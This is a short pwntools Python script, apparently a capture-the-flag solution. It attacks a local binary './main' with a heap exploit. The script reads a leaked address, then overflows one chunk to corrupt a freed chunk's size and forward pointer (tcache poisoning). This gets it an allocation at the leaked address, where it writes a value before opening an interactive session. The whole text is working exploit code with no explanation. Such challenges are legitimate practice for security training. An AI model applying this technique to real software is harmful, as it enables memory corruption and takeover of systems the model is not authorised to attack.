from pwn import *
def cmd(c):
	p.sendlineafter(">",str(c))
def add():
	cmd(1)
def free(idx):
	cmd(2)
	cmd(idx)
def edit(idx,c):
	cmd(3)
	cmd(idx)
	p.sendafter("\n",c)
p=process("./main")
p.readuntil("is ")
address=int(p.readuntil(",")[:-1],16)
add()#0
add()#1
add()#2
free(2)
free(1)
edit(0,b"A"*0x18+p64(0x21)+p64(address))
add()#1
add()#2
edit(2,p64(0xdeadbeef))
cmd(4)
p.interactive()
